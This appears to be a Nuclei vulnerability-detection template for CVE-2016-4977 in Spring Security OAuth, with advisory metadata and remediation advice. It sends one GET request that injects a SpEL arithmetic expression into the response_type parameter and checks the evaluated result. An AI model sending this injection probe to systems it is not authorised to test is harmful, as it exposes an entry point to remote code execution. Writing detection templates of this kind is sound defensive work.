id: CVE-2016-4977

info:
  name: Spring Security OAuth2 Remote Command Execution
  author: princechaddha
  severity: high
  description: Spring Security OAuth versions 2.0.0 to 2.0.9 and 1.0.0 to 1.0.5 contain a remote command execution vulnerability. When processing authorization requests using the whitelabel views, the response_type parameter value was executed as Spring SpEL which enabled a malicious user to trigger remote command execution via the crafting of the value for response_type.
  remediation: Users of 1.0.x should not use whitelabel views for approval and error pages. Users of 2.0.x should either not use whitelabel views for approval and error pages or upgrade to 2.0.10 or later.
  reference:
    - https://github.com/vulhub/vulhub/blob/master/spring/CVE-2016-4977/README.md
    - https://tanzu.vmware.com/security/cve-2016-4977
    - https://nvd.nist.gov/vuln/detail/CVE-2016-4977
    - https://pivotal.io/security/cve-2016-4977
    - http://www.openwall.com/lists/oss-security/2019/10/16/1
  classification:
    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 8.8
    cve-id: CVE-2016-4977
    cwe-id: CWE-19
    epss-score: 0.03345
    epss-percentile: 0.90319
    cpe: cpe:2.3:a:pivotal:spring_security_oauth:1.0.0:*:*:*:*:*:*:*
  metadata:
    max-request: 1
    vendor: pivotal
    product: spring_security_oauth
  tags: oauth2,oauth,rce,ssti,vulhub,cve,cve2016,spring

http:
  - method: GET
    path:
      - "{{BaseURL}}/oauth/authorize?response_type=${13337*73331}&client_id=acme&scope=openid&redirect_uri=http://test"

    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - "Unsupported response types: [978015547]"

      - type: status
        status:
          - 400

# digest: 490a0046304402202f0df60dbb0e7eab6cf95ee23906a57f6aacf56f4c3e43b4b468f020d2147dc802203b1c39cf7c625e5dc97bdac04bf73fb33aa6dcd1b341c333093f264e6d1d6b5a:922c64590222798bb761d5b6d8e72950
